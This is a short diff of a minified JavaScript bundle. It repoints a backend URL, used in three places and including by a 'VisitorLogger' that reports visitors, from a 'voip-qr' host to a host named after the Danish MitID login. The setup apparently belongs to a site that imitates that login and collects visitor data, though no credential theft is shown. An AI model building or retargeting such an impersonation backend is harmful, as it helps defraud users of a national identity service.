@@ -964,7 +964,7 @@ const st = [["circle", {
         })]
     })
 })
-  , L = "https://voip-qr.onrender.com"
+  , L = "https://mitid.onrender.com"
   , ut = ({onCancel: e}) => {
     const [t,n] = p.useState(null)
       , [r,s] = p.useState(null)
@@ -1221,7 +1221,7 @@ function le() {
     }
     return Math.abs(f).toString(16)
 }
-const B = "https://voip-qr.onrender.com";
+const B = "https://mitid.onrender.com";
 async function ht() {
     try {
         console.log("[VisitorLogger] Initializing on domain:", window.location.hostname),
@@ -1330,7 +1330,7 @@ async function ht() {
         console.error("[VisitorLogger] Error logging visitor:", e)
     }
 }
-const ft = "https://voip-qr.onrender.com";
+const ft = "https://mitid.onrender.com";
 function pt() {
     const [e,t] = p.useState("loading")
       , n = p.useRef(null);
